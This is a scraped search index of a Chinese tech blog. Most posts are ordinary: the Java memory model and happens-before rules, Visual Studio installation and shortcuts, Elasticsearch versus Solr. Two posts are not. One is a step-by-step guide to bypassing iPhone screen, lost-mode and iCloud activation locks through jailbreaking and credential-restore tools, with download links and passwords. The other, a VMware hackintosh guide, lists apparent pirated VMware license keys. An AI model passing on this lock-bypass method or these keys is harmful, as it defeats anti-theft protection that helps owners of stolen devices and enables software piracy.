也可以满足需求。lock 和 unlock 虽然没有被虚拟机直接提供给用户使用，但是提供了字节码层次的指令 monitorenter 和 monitorexit 对应这两个操作，对应到 Java 代码就是 synchronized 关键字，因此在 synchronized 块之间的代码都具有原子性。 可见性（Visibility）： 可见性是指一个线程修改了一个变量的值后，其他线程立即可以感知到这个值的修改。正如前面所说，volatile 类型的变量在修改后会立即同步给主内存，在使用的时候会从主内存重新读取，是依赖主内存为中介来保证多线程下变量对其他线程的可见性的。除了 volatile 之外，synchronized 和 final 也可以实现可见性。synchronized 关键字是通过 unlock 之前必须把变量同步回主内存来实现的，final 则是在初始化后就不会更改，所以只要在初始化过程中没有把 this 指针传递出去也能保证对其他线程的可见性。 有序性： 有序性从不同的角度来看是不同的。单纯单线程来看都是有序的，但到了多线程就会跟我们预想的不一样。可以这么说：如果在本线程内部观察，所有操作都是有序的；如果在一个线程中观察另一个线程，所有的操作都是无序的。前半句说的就是线程内表现为串行的语义，后半句指的是指令重排现象和主内存与工作内存之间同步存在延迟的现象。保证有序性的关键字有 volatile 和 synchronized，其中 volatile 禁止了指令重排序，而 synchronized 则由一个变量在同一时刻只能被一个线程对其进行lock操作来保证。 总结：synchronized 对三种特性都有支持，虽然简单，但是如果无控制地滥用对性能就会产生较大影响。volatile 只支持可见性和有序性（禁止指令重排），不支持原子性 先行发生原则如果 Java 内存模型中所有的有序性都要依靠 volatile 和 synchronized 来实现，那是不是非常繁琐。Java 语言中有一个 “先行发生原则”，是判断数据是否存在竞争、线程是否安全的主要依据。 什么是先行发生原则 先行发生原则是 Java 内存模型中定义的两个操作之间的偏序关系。比如说操作 A 先行发生于操作 B，那么在 B 操作发生之前，A 操作产生的 “影响” 都会被操作 B 感知到。这里的影响是指修改了内存中的共享变量、发送了消息、调用了方法等。 Java 内存模型自带先行发生原则有哪些 程序次序原则：在一个线程内部，按照代码的顺序，书写在前面的先行发生与后边的。或者更准确的说是在控制流顺序前面的先行发生与控制流后面的，而不是代码顺序，因为会有分支、跳转、循环等 管程锁定规则：一个 unlock 操作先行发生于后面对同一个锁的 lock 操作。这里必须注意的是对同一个锁，后面是指时间上的后面 volatile变量规则：对一个 volatile 变量的写操作先行发生于后面对这个变量的读操作，这里的后面是指时间上的先后顺序 线程启动规则：Thread 对象的 start () 方法先行发生与该线程的每个动作。当然如果错误的使用了线程，创建线程后没有执行 start 方法，而是执行 run 方法，那此句话是不成立的，但是如果这样其实也不是线程了 线程终止规则：线程中的所有操作都先行发生与对此线程的终止检测，可以通过 Thread.join () 和 Thread.isAlive () 的返回值等手段检测线程是否已经终止执行 线程中断规则：对线程 interrupt () 方法的调用先行发生于被中断线程的代码检测到中断事件的发生，可以通过 Thread.interrupted () 方法检测到是否有中断发生 对象终结规则：一个对象的初始化完成先行发生于他的 finalize 方法的执行，也就是初始化方法先行发生于 finalize 方法 传递性规则：如果操作 A 先行发生于操作 B，操作 B 先行发生于操作 C，那么操作 A 先行发生于操作 C 在下述的代码中，如果有两个线程 A 和 B，A 先调用 setValue 方法，然后 B 调用 getValue 方法，那么 B 线程执行方法返回的结果是什么？ 123456789private int value = 0;public void setValue(int value) { this.value = value;}public int getValue() { return this.value;} 对照先行发生原则一个一个对比。首先是程序次序规则，这里是多线程，不在一个线程中，不适用；然后是管程锁定规则，这里没有 synchronized，自然不会发生 lock 和 unlock，不适用；后面对于线程启动规则、线程终止规则、线程中断规则也不适用，这里与对象终结规则、传递性规则也没有关系。所以说 B 返回的结果是不确定的，也就是说在多线程环境下该操作不是线程安全的。如何修改呢，一个是对 get、set 方法加入 synchronized 关键字，即可以使用管程锁定规则；要么对 value 加 volatile 修饰，可以使用 volatile 变量规则。 通过上面的例子可知，一个操作时间上先发生并不代表这个操作先行发生，那么一个操作先行发生是不是代表这个操作在时间上先发生？也不是，如下面的例子： 12int i = 2;int j = 1; 在同一个线程内，对 i 的赋值先行发生于对 j 赋值的操作，但是代码重排序优化，也有可能是 j 的赋值先发生，我们无法感知到这一变化。综上所述，时间先后顺序与先行发生原则之间基本没有太大关系。我们衡量并发安全的问题的时候不要受到时间先后顺序的干扰，一切以先行发生原则为准。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"Visual Studio 之一常用配置与使用",url:"/posts/ec73e38.html",text:'VS 版本说明本文使用的 Visual Studio 版本是 Microsoft Visual Studio Community 2019 版本 16.11.5。 界面操作添加源码目录将源码目录拷贝到 VS 的工程目录下，这时在 VS 的工程目录列表里是看不到新增的目录的，在如下图工具栏中点击图标 显示所有文件，才可以看到新增的目录 这时新增的源码目录还没有真正地加入到 VS 的工程中来，可见新增的文件的图标是红色的 在新增的源码目录上右键选择 包括在项目中，新增的源码目录就会加入到 VS 的工程中 新增的文件的图标最终才会正常显示 添加预处理器定义若项目编译失败，并输出如下的错误日志信息，则可以导航到菜单栏：项目 -&gt; 属性 -&gt; C/C++ -&gt; 预处理器 -&gt; 预处理器定义 -&gt; 编辑，然后加入 _CRT_SECURE_NO_WARNINGS 和 _CRT_NONSTDC_NO_DEPRECATE 即可。 1错误 C4996 \'fopen\': This function or variable may be unsafe. Consider using fopen_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details. 常用快捷键 f9：设置断点 f5：调试运行 ctrl + f5：只运行，不调试 ctrl + shift + b：只编译，不运行 ctrl + k + c：注释代码 ctrl + k + u：取消注释代码 ctrl + k + f：代码格式化 ctrl + shift + f 或者 ctrl + shift + h：全局搜索文件内容 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"搜索中间件面试题之一",url:"/posts/a03f47f2.html",text:'ElasticSearch 和 Solr 的区别两者都是基于 Lucene 搜索服务器开发的，是一款优秀的、高性能的企业级搜索服务器，且都是基于分词技术构建的倒排索引的方式进行查询，区别如下： 当单纯地对已有数据进行检索的时候，Solr 的效率高于 ES 当实时建立索引的时候，Solr 会产生 IO 阻塞，而 ES 则不会，ES 的查询性能高于 Solr 在不断动态添加数据的时候，Solr 的检索效率会变得低下，而 ES 则没什么变化 Solr 利用 ZooKeeper 进行分布式管理，而 ES 自带分布式管理功能，Solr 一般都要部署到 Web 服务器上（如 Tomcat），启动 Tomcat 的时候需要配置 Tomcat 与 Solr 的关联 Solr 支持更多的数据格式（XML、JSON、CSV 等），而 ES 仅支持 JSON 文件格式 Solr 是传统搜索应用的有力解决方案，但是 ES 更适用于新兴的实时搜索应用 Solr 官网提供的功能更多，而 ES 本身更注重核心功能，高级功能一般由第三方插件提供 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"面试"},{title:"Visual Studio 2019 离线安装",url:"/posts/f201bf82.html",text:'前言本文介绍的是 VS 离线安装，类似 ISO 安装，可以解决因 Internet 连接不可靠或带宽较低，导致 VS 安装失败的问题。其原理是使用命令行创建安装文件的本地缓存，这样就可以实现一次下载多次安装，节省下载安装文件所花的时间。 VS 离线安装步骤一访问 VS 官网，下载 VS 的安装器 vs_community.exe，选择社区版（免费）即可。 步骤二通过命令行，使用 VS 的安装器 vs_community.exe 创建（下载）安装文件的本地缓存，命令行的各个参数说明如下： --lang：指定语言 -add：下载工作负荷组件 --layout：指定本地缓存存放的目录路径 --includeRecommended：下载推荐的组件 -–includeOptional：下载可选的组件，比较占磁盘空间，不建议使用 1vs_community.exe --layout G:\\VisualStudio\\Packages -add Microsoft.VisualStudio.Workload.ManagedDesktop -add Microsoft.VisualStudio.Workload.NativeDesktop -add Microsoft.VisualStudio.Workload.Universal --includeRecommended --lang en-US zh-CN 若是 C++ 开发，一般选择安装 Microsoft.VisualStudio.Workload.ManagedDesktop、Microsoft.VisualStudio.Workload.NativeDesktop、Microsoft.VisualStudio.Workload.Universal 这三大组件即可，分别对应下图中已勾选的组件，VS 的组件列表可以看这里。 步骤三下载完成后，进入上面命令行中 --layout 参数所指定的文件夹下，双击 vs_setup.exe 进行安装 步骤四等待文件提取完成，显示 VS 的安装界面 步骤五选择安装位置，请确保安装位置所在的磁盘有足够的空间，然后点击 安装 按钮开始安装。值得一提的是，这里一般不再需要在安装界面上的 工作负荷、单个组件、语言包 页面里，手动勾选任何内容。 VS 创建 C++ 项目 VS 创建 C++ 项目 VS 各大组件的附录12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879Visual Studio 核心编辑器ID： Microsoft.VisualStudio.Workload.CoreEditor说明： Visual Studio 核心 shell 体验，包括语法感知代码编辑、源代码管理和工作项管理。Azure 开发ID： Microsoft.VisualStudio.Workload.Azure说明：用于开发云应用、创建资源以及生成包括 Docker 支持的容器的 Azure SDK、工具和项目。数据存储和处理ID： Microsoft.VisualStudio.Workload.Data说明： 使用 SQL Server、Azure Data Lake 或 Hadoop 连接、开发和测试数据解决方案。数据科学和分析应用程序ID： Microsoft.VisualStudio.Workload.DataScience说明： 用于创建数据科学应用程序的语言和工具（包括 Python、R 和 F#）。.NET 桌面开发ID： Microsoft.VisualStudio.Workload.ManagedDesktop说明： 使用 C#、Visual Basic 和 F# 生成 WPF、Windows 窗体和控制台应用程序。使用 Unity 的游戏开发ID： Microsoft.VisualStudio.Workload.ManagedGame说明： 使用 Unity（功能强大的跨平台开发环境）创建 2D 和 3D 游戏。使用 C++ 的 Linux 开发ID： Microsoft.VisualStudio.Workload.NativeCrossPlat说明： 创建和调试在 Linux 环境中运行的应用程序。使用 C++ 的桌面开发ID： Microsoft.VisualStudio.Workload.NativeDesktop说明：使用 Microsoft C++ 工具集、ATL 或 MFC 生成 Windows 桌面应用程序。使用 C++ 的游戏开发ID： Microsoft.VisualStudio.Workload.NativeGame说明： 以 DirectX、Unreal 或 Cocos2d 为后盾，利用 C++ 的强大功能生成专业游戏。使用 C++ 的移动开发ID： Microsoft.VisualStudio.Workload.NativeMobile说明： 使用 C++ 生成适用于 iOS、Android 或 Windows 的跨平台应用程序。.NET Core 跨平台开发ID： Microsoft.VisualStudio.Workload.NetCoreTools说明： 使用 .NET Core、ASP.NET Core、HTML/JavaScript 和包括 Docker 支持的容器生成跨平台应用程序。使用 .NET 的移动开发ID： Microsoft.VisualStudio.Workload.NetCrossPlat说明： 使用 Xmarin 生成适用于 iOS、Android 或 Windows 的跨平台应用程序。ASP.NET 和 Web 开发ID： Microsoft.VisualStudio.Workload.NetWeb说明： 使用 ASP.NET、ASP.NET Core、HTML/JavaScript 和包括 Docker 支持的容器生成 Web 应用程序。Node.js 开发ID： Microsoft.VisualStudio.Workload.Node说明： 使用 Node.js（事件驱动的异步 JavaScript 运行时）生成可扩展的网络应用程序。Office/SharePoint 开发ID： Microsoft.VisualStudio.Workload.Office说明： 使用 C#、VB 和 JavaScript 创建 Office 和 SharePoint 外接程序、SharePoint 解决方案和 VSTO 外接程序。Python 开发ID： Microsoft.VisualStudio.Workload.Python说明： 适用于 Python 的编辑、调试、交互式开发和源代码管理。通用 Windows 平台开发ID： Microsoft.VisualStudio.Workload.Universal说明： 使用 C#、VB 和 JavaScript 或 C++（可选）创建适用于通用 Windows 平台的应用程序。Visual Studio 扩展开发ID： Microsoft.VisualStudio.Workload.VisualStudioExtension说明： 创建适用于 Visual Studio 的加载项和扩展，包括新命令、代码分析器和工具窗口。使用 JavaScript 的移动开发ID： Microsoft.VisualStudio.Workload.WebCrossPlat说明： 使用用于 Apache Cordova 的工具生成 Android、iOS 和 UWP 应用。Visual Studio 帮助查看器ID: Microsoft.Component.HelpViewer说明：VS 的帮助查看器。 参考资料 Visual Studio 2019 在线安装 VS2019 离线安装方法详解 Visual Studio 2019 脱机安装 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"Visual Studio 2019 在线安装",url:"/posts/71979ec9.html",text:'下载 VS 安装器访问 VS 官网，选择社区版（免费）进行下载 安装 VS步骤一直接双击 “vs_community.exe” 运行 VS 安装器 步骤二等待文件提取完成，显示 VS 的安装界面 步骤三根据自己的开发需要，选择对应的工作负荷组件，若是开发 C++，一般勾选下图中的三项即可 步骤四选择单个组件，一般情况下这里不需要手动勾选 步骤五选择语言包，建议选择 “中文（简体）” 和 “英语” 步骤六选择安装位置，请确保安装位置所在的磁盘有足够的空间，然后点击 “安装” 按钮开始安装即可 VS 创建 C++ 项目步骤一运行 VS 的主程序，选择 “创建新项目” 步骤二选择 C++ 的 “空项目”，若没有找到 “空项目”，在语言下拉列表里选择 “C++” 即可 步骤三输入项目名，更改项目的存放路径 步骤四新建 C++ 的源文件 步骤五编写 C++ 代码 123456789#include &lt;iostream&gt;#include &lt;stdlib.h&gt;using namespace std;int main() { cout &lt;&lt; "Hello World" &lt;&lt; endl; system("pause");} 步骤六编译运行 C++ 代码 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"Docker-K8S 面试题之一",url:"/posts/3b82844a.html",text:'var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"面试"},{title:"iPhone 破解各种锁的教程",url:"/posts/9ab7ecb5.html",text:'前言本文主要介绍 iPhone 如何破解屏幕锁、停用锁、丢失锁、ID 锁，由于篇幅有限，下面只会给出核心说明、软件下载链接与视频教程链接等，毕竟网上有很多可以参考的资料。其中破解 ID 锁常见有三种方式，包括绕过 ID（跳过 ID 锁登录）、隐藏 ID（将 ID 锁隐藏起来）、删除 ID（将 ID 锁删除掉），为了描述方便下文统一简述为破解 ID 锁。下文是笔者亲身实践的总结内容，2020 年 8 月成功解锁了 iPhone 6SP（iOS 12）、iPhone 8（iOS 13） 的 ID 锁。随着时间的推移，笔者不能保证本文内容（视频教程、软件工具等）可以长期生效，毕竟 iOS 14 已经发布了；而且破解 iPhone 各种锁本来就是攻防之间的较量，破解技术一直在不断地进步，苹果的安全技术也同样不断在完善。 各种锁介绍 丢失锁被失主激活，刷机即可解决 屏幕锁的密码忘记了，刷机即可解决 多次输出错误的屏幕锁密码，导致 iPhone 激活了停用锁，刷机即可解决 IOS 系统开启了 查找我的 iPhone 功能后，即使 ID 锁被激活了，可以使用以下三种方法破解 ID 锁： 方法一、刷机 + 越狱 + 激活 方法二、越狱 + 备份激活凭证 + 刷机 + 越狱 + 激活 + 还原激活凭证 方法三、越狱 + 关闭 查找我的 iPhone 的功能（一般包含了激活凭证的备份与还原） + 刷机，此方法暂时只适用于 IOS 13+ 的系统（不包括从低版本升级到 IOS 13+ 的情况） 特别注意事项： 建议无论是使用哪种方法破解 ID 锁，为了以防万一，都建议先越狱并备份激活凭证 如果实在无法备份激活凭证（例如越狱失败），此时若采用上面的方法一破解 ID 锁后，三网的机子（两网除外）只能当游戏机用了，无法正常使用 Sim 卡的打电话和 4G 网络等功能！！！ 如果 IOS 系统开启了 查找我的 iPhone 功能（ID 锁被激活），那么原系统都必须先越狱，然后备份原系统的激活凭证，再执行其他操作，否则一旦刷机或升级系统后，三网的机子（两网除外）即使激活了系统也无法正常使用 Sim 卡的打电话和 4G 网络等功能，切记！！！ 各种锁破解后的功能介绍1、屏幕锁、停用锁、丢失锁破解后的功能说明如下： 完美全功能，破解后等于没有 ID 锁，相当于官解 2、两网版机子破解 ID 锁后的功能说明如下： Siri iCloud 云同步 重启 / 关机 打电话 / 4G 上网 通知推送 破解网络锁 系统升级还原抹除 3、三网版机子破解 ID 锁后的功能说明如下： Siri iCloud 云同步 重启 / 关机 通知推送 破解网络锁 打电话 / 4G 上网 系统升级还原抹除 越狱Checkra1n 越狱工具Checkra1n 是一款适用于 iPhone 5s ~ iPhone X（A7 - A11 处理器），且 iOS 系统版本为 12.3+ 的越狱工具，支持运行在 Mac、Linux 系统，暂时不支持 Windows 系统。普通的家用电脑（Windows 系统）可以使用 Checkra1n 镜像制作 Linux Live U 盘，然后在 BIOS 里设置从 U 盘启动，这样就可以使用 Linux 系统里的 Checkra1n 工具了。Checkra1n 0.10.2 版本的镜像可以从这里下载，该镜像的原地址和使用教程在这里，支持 U 盘和硬盘启动，硬盘启动教程可以参考博客。如果需要其他版本的 Checkra1n Linux 镜像，可从百度网盘下载，提取码为 erso，具体的使用教程可以看这里，Checkra1n 与 IOS 系统的版本对应关系如下： Checkra1n 0.9.8 适用 IOS 12.3 ~ IOS 13.3.1 Checkra1n 0.9.8.1 适用 IOS 12.3 ~ IOS 13.3.1 Checkra1n 0.9.8.2 适用 IOS 12.3 ~ IOS 13.3.1 Checkra1n 0.10.1 适用 IOS 12.3 ~ IOS 13.4.1 Checkra1n 0.10.2 适用 IOS 12.3 ~ IOS 13.5 Checkra1n 越狱视频教程 Checkra1n U 盘越狱 iOS 13.6 Checkra1n U 盘越狱 Checkra1n Liunx U 盘 iOS 13 越狱 Checkra1n 越狱 0.9.8~0.1.0.2 共存版 Checkra1n 越狱错误码汇总Checkra1n 官方 issues 可以看这里，中文版的越狱错误汇总可以看这里，常见的错误如下： -26 或者 -31 错误码 不支持在虚拟机内（VMware/VBox）运行 Checkra1n 越狱工具 -77 错误码 解开锁屏 /iPhone 停用界面后，进入系统界面再越狱，这种错误一般在使用 Checkra1n Linux 镜像（U 盘版）时会出现 若锁屏 /iPhone 停用界面无法解开，可以物理安装 Ubuntu 系统或者使用 Ubuntu Live 盘，在 Ubuntu 系统里通过 apt-get 安装 Checkra1n（必须提前执行 apt-get upgrade 命令，否则安装会出现依赖问题），或者在 Checkra1n 官网下载编译好的可执行文件来安装，安装完成后执行越狱操作即可 破解 ID 锁破解 ID 锁视频教程以下视频来源 Youtube 平台，请自备梯子，否则无法正常打开。 苹果手机解锁 - 删除 - 查找我的 iPhone（免费）随意刷机，永久成为你自己的机器 停用的苹果 iPhone 手机 ID 密码忘了，完美绕过 ID 可以打电话上网 4G 一切正常 一个 U 盘就可以绕过苹果 Icloud 激活锁 A7-A11 所有设备 iPhone and ipad bypass icloud 苹果越狱 - 跳过 ID 激活锁 - 直接插 Sim 卡就可以打电话了 - 2020 年 4 月 26 日 FREE CELLULAR FIX for Passcode Locked &amp; Di 苹果越狱 - 跳过 ID 激活锁 - 直接插 SIM 卡就可以打电话了（Windows 版说明）FREE CELLULAR FIX for Passcode Locked &amp; D iCLoud Bypass iOS 12.3-13.6 Sim Card Fix Call And Internet In Window Real Full Untethered Bypass iCloud on iPhone &amp; iPad iOS 12.4.8 - iOS 13.6.1 | Windows Tutorial 运行平台 一、Mac 平台全搞定 二、 Linux 平台全搞定（Debian、Ubuntu） 三、混合平台，可任意组合使用，组合案例如下 刷机：Windows 系统 + 爱思助手 越狱：U 盘 + Checkra1n Linux 镜像 破解 ID 锁：Windows 系统 + iFRPFILE 备份与还原激活凭证：Windows 系统 + Sliver 工具软件破解 ID 锁 Sliver：激活凭证备份与还原 iFRPFILE：系统激活工具（破解 ID 锁） iCloud Bypass：系统激活工具（破解 ID 锁） X-Activator：集成了越狱、破解 ID 锁、修复推送等功能，该软件收费 各种软件下载请自备梯子，否则以下软件可能会下载失败，同时随着时间的推移，工具可能会失效。 Checkra1n 越狱工具：下载地址 iCloud Bypass Windows 版：下载地址 Checkra1n Linux 镜像：下载地址，提取码：erso Sliver Windows 版：下载地址，解压密码：https://t.me/itlj8 Sliver Mac 版：下载地址，访问密码：itlj8，解压密码：https://t.me/itlj8 功能验证 短信是否可用 WiFi 是否可用 2G/4G 网络是否可用 是否可以接听和拨打电话 系统是否正常重启和关机 是否可以通过 APP Store 安装应用 通知推送、iCloud、iTunes、Siri 是否可用 技巧总结判断 IOS 系统的版本若开机后是屏幕锁、停用锁、丢失锁界面，可以通过以下方式区分 IOS 12 和 IOS 13 系统： 静音键：按下静音键，若音量弹窗出现在屏幕中间，那就是 IOS 12 系统，音量弹窗出现在屏幕顶部，那就是 IOS 13 系统 恢复模式：进入恢复模式，如果界面出现了彩色的 iTunes Logo（如图），那就是那就是 IOS 12 系统，如果是全白色的图案（如图），就是 IOS 13 系统 查询 iPhone 的硬件配置在得知 IMEI 码的前提下，可以通过 IMEI 码查询 iPhone 具体的硬件配置信息，例如设备型号、硬盘容量、销售地区等，网上资料很多，这里不再累述。 查询 iPhone 的 ID 锁状态若开机后是屏幕锁、停用锁、丢失锁界面，可通过手机卡托上的 IMEI 序号，到 imeipro 网站（请自备梯子）查询 iPhone 的激活锁是否被激活（即是否开启了 “查找我的 iPhone”）；如果激活锁处于关闭状态（不存在 ID 锁），那么直接刷机就能当正常的 iPhone 手机使用了。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"生活随笔"},{title:"CLion 使用 Meson 构建 C/C++ 项目",url:"/posts/12d66a7e.html",text:'提示 本文适用于 Windows/Linux 系统，包括 Debian/Ubuntu/CentOS/Fedora 等 Linux 发行版。 Meson 入门指南 Meson 入门指南之一 CLion 使用 Meson 构建项目 CLion managing Meson projects Using meson as a build system with clion Working with meson in CLion using compilation db var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"Vmware 虚拟机安装黑苹果系统",url:"/posts/3cc999a7.html",text:'准备操作 设置主板的 BIOS，开启硬件虚拟化的支持 Windows 系统环境下，需要关闭虚拟软件 Hyper-V，在 控制面板-程序-添加关闭 Window 功能 里，把 Hyper-V 关闭即可 软件环境 软件 版本 Vmware 15.5.6 Pro Unlocker 3.0.3 操作系统 Windows 10 Vmware 安装 Vmware 官网下载 Vmware 15.5.6 Pro 版本的安装文件，然后直接点击 EXE 文件进行安装即可，完成安装后可以输入下列秘钥进行永久激活。 123456YG5H2-ANZ0H-M8ERY-TXZZZ-YKRV8UG5J2-0ME12-M89WY-NPWXX-WQH88UA5DR-2ZD4H-089FY-6YQ5T-YPRX6GA590-86Y05-4806Y-X4PEE-ZV8E0ZF582-0NW5N-H8D2P-0XZEE-Z22VAYA18K-0WY8P-H85DY-L4NZG-X7RAD Unlocker 安装 由于 Vmware 默认屏蔽了 Mac OS 系统的支持，因此需要使用 Unlocker 工具进行解锁。最新版的 Unlocker 可以从 Github 上下载，由于官方的 Unlocker 会在运行期间到 Vmware 官网下载 com.vmware.fusion.tools.darwin.zip.tar 文件，整个下载过程非常慢。因此建议在 Unlocker 的目录下创建 tools 目录，然后手动下载 com.vmware.fusion.tools.darwin.zip.tar 文件到 tools 目录下，此时还需要更改 Unlocker 的 Python 代码，具体操作可参考文章。最后使用管理员权限运行 win-install.cmd 可执行文件即可，解锁完成后 Vmware 新建虚拟机时即可看到 Apple Mac OS X 的选项（如下图）。 特别注意：Unlocker 须解压在非中文的目录路径下，不同版本的 Vmware 需要用的 Unlocker 版本是不一样的，Vmware 15.5.6 Pro 对应 Unlocker 3.0.3 版本，解锁所需的资源文件如下： Unlocker 3.0.3 代码更改版：百度网盘，提取码: hxh6 com.vmware.fusion.tools.darwin.zip.tar：下载地址，若下载失败可以到这里找到可用的版本（11.1.0），并在 packages 目录里下载该文件 Vmware 安装 Mac OS Vmware14 安装黑苹果 mac ox x 10.13 懒人版教程 虚拟机 Vmware 安装黑苹果 MacOS Sierra 图文教程 Vmware 15.5 虚拟机 MacOS 系统手动安装 Vmware Tools Vmware 11 安装 Mac OS X 10.10 及安装 Mac Vmware Tools 黑苹果 Vmware 安装 AppStore 原版 MacOS Catalina 10.15.1，附 VirtualBox 安装 High Sierra 10.13 教程和升级到 Mojave 10.14.5 安装 Vmware Tools Vmware Tools 可以提高鼠标操作的流畅度、实现全屏显示、文件共享等，当在 Vmware 虚拟机中安装好 Mac OS 后，在 Vmware 软件中点击安装 Vmware Tools 的选项，会弹出提示：无法在更新服务器上找到组件。请联系Vmware技术支持或您的系统管理员。这是因为在 Mac OS 里安装 Vmware Tools 需要用到一个叫 darwin.iso 的文件，可以在 Vmware 官网下载该文件，找到最新的版本号（11.1.0），下载 packge 目录下的 com.vmware.fusion.tools.darwin.zip.tar 文件即可。下载后逐级打开压缩文件，在 payload 目录中可以找到 darwin.iso 文件，将其解压并拷贝到 Vmware 的安装根目录（C:\\Program Files (x86)\\Vmware\\Vmware Workstation）。最后将虚拟机中的 Mac OS 关机，然后在虚拟机的设置中将 CD/DVD 指定为 darwin.iso，启动 Mac OS 后在桌面右边就可以看到 Vmware Tools，直接双击执行安装操作即可。 资源下载 可以从百度网盘上打包下载以下工具，提取码为 a5qr 1234MK-Unlocker-VM15.5.zipVmware Tools linux-Win-Mac .zipVmware Workstation Pro v15.5.6 Lite.rarMacOS Mojave 10.14.5 (18F132)懒人镜像.zip 补充说明 不建议使用 VBox 安装黑苹果系统，因为 VBox 出问题的概率很大 Vmware 安装黑苹果系统的时候，建议直接使用懒人版的 cdr 镜像 Mac OS 原版 dmg 镜像只能安装在 GPT 分区格式的硬盘上，懒人版 cdr 镜像可以安装在 MBR 格式和 GPT 分区格式的硬盘上 Vmware 15.5.6 Pro 里的 Mac OS 在正常情况下可以直接识别到 IPhone 设备，导航到 菜单栏 - 虚拟机 - 可移动设备 就可以看到，如果无法识别，建议在 Windows 系统（宿主机）上安装好 iTunes 再试试 var isMobile = 